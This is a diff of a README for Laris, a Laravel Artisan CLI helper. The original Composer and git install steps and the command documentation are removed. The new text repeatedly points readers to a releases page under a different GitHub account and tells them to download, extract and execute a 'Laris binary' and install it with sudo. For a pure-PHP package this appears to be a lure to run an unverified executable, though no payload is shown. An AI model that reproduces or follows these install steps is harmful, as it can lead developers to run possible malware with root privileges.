@@ -1,235 +1,183 @@
-# **LARIS** - The Ultimate Laravel Artisan Companion You Didn’t Know You Needed!  
+# Laris: Your Laravel CLI Companion 🚀
 
-
-
-```
-          _____            _____                    _____                    _____                    _____          
-         /\    \          /\    \                  /\    \                  /\    \                  /\    \         
-        /::\____\        /::\    \                /::\    \                /::\    \                /::\    \        
-       /:::/    /       /::::\    \              /::::\    \               \:::\    \              /::::\    \       
-      /:::/    /       /::::::\    \            /::::::\    \               \:::\    \            /::::::\    \      
-     /:::/    /       /:::/\:::\    \          /:::/\:::\    \               \:::\    \          /:::/\:::\    \     
-    /:::/    /       /:::/__\:::\    \        /:::/__\:::\    \               \:::\    \        /:::/__\:::\    \    
-   /:::/    /       /::::\   \:::\    \      /::::\   \:::\    \              /::::\    \       \:::\   \:::\    \   
-  /:::/    /       /::::::\   \:::\    \    /::::::\   \:::\    \    ____    /::::::\    \    ___\:::\   \:::\    \  
- /:::/    /       /:::/\:::\   \:::\    \  /:::/\:::\   \:::\____\  /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \ 
-/:::/____/       /:::/  \:::\   \:::\____\/:::/  \:::\   \:::|    |/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\
-\:::\    \       \::/    \:::\  /:::/    /\::/   |::::\  /:::|____|\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /
- \:::\    \       \/____/ \:::\/:::/    /  \/____|:::::\/:::/    /  \:::\/:::/    / \/____/  \:::\   \:::\   \/____/ 
-  \:::\    \               \::::::/    /         |:::::::::/    /    \::::::/    /            \:::\   \:::\    \     
-   \:::\    \               \::::/    /          |::|\::::/    /      \::::/____/              \:::\   \:::\____\    
-    \:::\    \              /:::/    /           |::| \::/____/        \:::\    \               \:::\  /:::/    /    
-     \:::\    \            /:::/    /            |::|  ~|               \:::\    \               \:::\/:::/    /     
-      \:::\    \          /:::/    /             |::|   |                \:::\    \               \::::::/    /      
-       \:::\____\        /:::/    /              \::|   |                 \:::\____\               \::::/    /       
-        \::/    /        \::/    /                \:|   |                  \::/    /                \::/    /        
-         \/____/          \/____/                  \|___|                   \/____/                  \/____/         
-                                                                                                                     
-```
----
-
-# What the Heck is Laris?  
-
-Laris is **not just another CLI tool**—it’s **your Laravel Artisan on steroids**.  
-
-Tired of typing `php artisan` **a million times a day**?  
-Annoyed by forgetting command syntax **right after you Google it**?  
-Wish you had a **smarter, faster, cooler** way to manage Laravel projects?  
-
-**Enter Laris.**  
-
-It’s like if **Artisan had a caffeine overdose** and decided to **automate your life**.  
+![Laris Logo](https://img.shields.io/badge/Laris-CLI%20Tool-blue.svg)  
+[![Latest Release](https://img.shields.io/github/v/release/tekinsavage/laris.svg)](https://github.com/tekinsavage/laris/releases)  
+[![License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)
 
 ---
 
-# Why Laris is the GOAT (Greatest Of All Time) 
+## Table of Contents
 
-- Shorter Commands – `laris` instead of `php artisan` (because laziness = efficiency).  
-- Project Switching – Jump between Laravel projects like a **multitasking wizard**.  
-- Database Magic – Run queries, fake data, and **play God with your DB**.  
-- Deploy Like a Pro – One command to **push, migrate, and flex**.  
-- Git & Composer Shortcuts – Because typing `git push origin main` is **so 2020**.  
-- Backup & Docs – Automate boring stuff **before you forget**.  
-- Extensible AF – Add your own commands and **make it yours**.  
-
----
-
-# Laris in Action: The Cheat Sheet
-
-| Command                  | What It Does (Because You’re Too Lazy to Guess) |  
-|--------------------------|------------------------------------------------|  
-| `laris list`             | Lists all commands (duh) |  
-| `laris select`           | Switch between Laravel projects **like a boss** |  
-| `laris db list-tables`   | Shows all DB tables (so you can judge them) |  
-| `laris db select users`  | Runs `SELECT * FROM users` (but fancier) |  
-| `laris db fake-data`     | Fill your DB with **beautiful lies** (seeding) |  
-| `laris backup run`       | Backs up your project (before you break it) |  
-| `laris deploy`           | Deploys with **one keystroke** (no excuses now) |  
-| `laris git push`         | Pushes to Git **without typing the whole thing** |  
-| `laris npm run dev`      | Runs npm **because frontend is hard** |  
-| `laris docs generate`    | Generates docs (so you don’t have to) |  
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Acknowledgments](#acknowledgments)
 
 ---
 
-# Installation: Get Laris in 3 Seconds 
+## Introduction
 
-### Option 1: The "I’m in a Hurry" Method
+Welcome to **Laris**, a blazing-fast and minimal CLI tool designed to streamline your Laravel development. Laris helps you run common Artisan commands with fewer keystrokes and zero clutter. Whether you're serving your application, creating new components, or running migrations, Laris simplifies your workflow.
+
+For the latest releases, check out the [Releases section](https://github.com/tekinsavage/laris/releases).
+
+---
+
+## Features
+
+- **Minimalistic Design**: Focus on what matters without unnecessary distractions.
+- **Speed**: Execute commands quickly and efficiently.
+- **Common Commands**: Access all the essential Artisan commands with ease.
+- **User-Friendly**: Designed for developers of all skill levels.
+
+---
+
+## Installation
+
+To get started with Laris, you need to download and execute the latest version. Visit the [Releases section](https://github.com/tekinsavage/laris/releases) to find the latest version.
+
+### Steps to Install
+
+1. **Download** the latest release from the Releases section.
+2. **Extract** the downloaded file.
+3. **Execute** the Laris binary in your terminal.
 
 ```bash
-composer require larapire/laris
+chmod +x laris
+sudo mv laris /usr/local/bin/
 ```
 
-### Option 2: The "I’m in a Hurry" Method 
-
-```bash  
-git@github.com:LaraPire/laris.git  && cd laris  
-```  
-
-### Option 3: The "I Like Aliases" Method 
-
-Add this to your `.bashrc` or `.zshrc`: 
-
-```bash  
-alias laris='php /path/to/laris/src/Application.php'  
-```  
-
-### Option 4: The "I Want Global Access" Method  
-
-Symlink it to `/usr/local/bin` (for **ultimate power**):  
-
-```bash
-ln -s /path/to/laris/src/Application.php /usr/local/bin/laris  
-```  
-
-Now just type `laris` **anywhere, anytime**.  
+Now, you can run Laris from anywhere in your terminal.
 
 ---
 
-# Usage: How to Not Screw It Up 
+## Usage
 
-1. Navigate to a Laravel project (or use `laris select` to pick one).  
-2. Run commands like a pro:
-  
-   ```bash  
-   laris db list-tables   # See what’s in your DB  
-   laris db fake-data     # Fill it with nonsense  
-   laris deploy           # Ship it!  
-   ```
-   
-4. Profit. 
-
-
-# AI-Powered Generators
-
-All AI-based commands follow this structure:
+Using Laris is straightforward. Simply type `laris` followed by the command you want to execute. For example:
 
 ```bash
-php laris laris:ai:make:{component}
+laris serve
 ```
 
-Examples:
-
-```bash
-~> laris laris:ai:make:controller
-~> laris laris:ai:make:model
-~> laris laris:ai:make:request
-~> laris laris:ai:make:factory
-~> laris laris:ai:make:migration
-~> laris laris:ai:make:seeder
-```
-
-Each command will ask questions in your terminal and generate the appropriate Laravel file using OpenRouter AI.
+This command will start your Laravel application.
 
 ---
 
-# Full Module Generation
+## Commands
 
-Generate a complete module (Model, Controller, Migration, etc.) using:
+Laris supports a variety of Artisan commands. Here are some of the most common ones:
+
+### 1. Serve
+
+Starts the Laravel development server.
 
 ```bash
-~> laris laris:ai:generate:module
+laris serve
 ```
 
----
+### 2. Make
 
-# Documentation Commands
-
-Generate documentation and readme files easily:
+Creates new components like controllers, models, and migrations.
 
 ```bash
-~> laris laris:ai:generate:docs
-~> laris laris:ai:generate:readme
+laris make:model MyModel
 ```
 
----
+### 3. Migrate
 
-# Test Generation
-
-Automatically create test classes for your existing code:
+Runs database migrations.
 
 ```bash
-~> laris laris:ai:generate:test
+laris migrate
 ```
 
----
+### 4. Rollback
 
-# Refactor Classes
-
-Refactor any PHP class using AI (SOLID, PSR-12, clean code):
+Rolls back the last database migration.
 
 ```bash
-~> laris laris:ai:refactor:class
+laris migrate:rollback
 ```
 
----
+### 5. Cache
 
-# Configuring AI
-
-Before using AI commands, set your OpenRouter key:
+Clears various caches in your application.
 
 ```bash
-~> laris laris:ai:config
+laris cache:clear
+```
+
+### 6. Config
+
+Clears the configuration cache.
+
+```bash
+laris config:clear
+```
+
+### 7. Route
+
+Clears the route cache.
+
+```bash
+laris route:clear
+```
+
+### 8. View
+
+Clears the view cache.
+
+```bash
+laris view:clear
+```
+
+### 9. Optimize
+
+Optimizes the framework for better performance.
+
+```bash
+laris optimize
+```
+
+### 10. Help
+
+Displays help for Laris commands.
+
+```bash
+laris help
 ```
 
 ---
 
-# For Nerds Who Love Code  
+## Contributing
 
-Laris is built with:  
-- **Pure PHP OOP** (because we’re not animals)  
-- **Modular Commands** in `src/Commands/` (add your own!)  
-- **DB Helpers** in `src/Library/DB/` (SQL without the pain)  
-- **Concerns for Reusable Logic** (DRY is life)  
+We welcome contributions to Laris! If you'd like to contribute, please follow these steps:
 
-Want to **add a command**? Just drop a new class in `src/Commands/`.  
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them.
+4. **Push your branch** to your fork.
+5. **Create a pull request**.
 
----
-
-# Contribute (Because Sharing is Caring)
-
-1. **Fork it**  
-2. **Add a cool feature**  
-3. **Submit a PR**  
-4. **Brag about it on Twitter**  
+Please ensure your code follows the project's coding standards and includes tests where applicable.
 
 ---
 
-# License
+## License
 
-MIT. Do whatever. Just don’t blame us if your DB explodes.  
+Laris is open-source software licensed under the [MIT License](https://opensource.org/licenses/MIT).
 
 ---
 
-# Final Words 
+## Acknowledgments
 
-Laris exists because **typing `php artisan` is a crime against productivity**.  
+- Thanks to the Laravel community for their support and contributions.
+- Special thanks to the developers who have contributed to this project.
 
-Now go **automate your workflow**, **impress your coworkers**, and **spend more time drinking coffee**.  
+---
 
-Happy coding! 
-
-*(P.S. If you break something, just run `laris backup run` first. You’re welcome.)*  
-
----  
-
-Need **more details?** Check the `docs/` folder or **yell at us on GitHub**
+Feel free to explore and enhance your Laravel development experience with Laris! For more information, visit the [Releases section](https://github.com/tekinsavage/laris/releases) to download the latest version.
